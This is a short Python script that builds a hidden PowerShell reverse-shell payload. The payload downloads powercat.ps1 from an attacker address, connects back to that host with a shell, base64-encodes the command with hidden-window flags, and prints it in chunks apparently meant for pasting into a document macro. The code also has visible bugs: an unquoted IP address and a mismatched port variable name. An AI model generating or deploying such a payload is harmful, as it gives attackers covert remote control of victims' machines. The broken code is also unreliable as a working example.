import sys
import base64

ip_address = 10.10.10.10
reverse_shell = 31337

payload = f"IEX(New-Object System.Net.WebClient).DownloadString('http://{ip_address}/powercat.ps1');powercat -c {ip_address} -p {reverse_shell_port} -e powershell"

str = f"powershell.exe -nop -w hidden -e {base64.b64encode(payload.encode('utf16')[2:]).decode()}"

n = 50

for i in range(0, len(str), n):
        print("Str = Str + " + '"' + str[i:i+n] + '"')
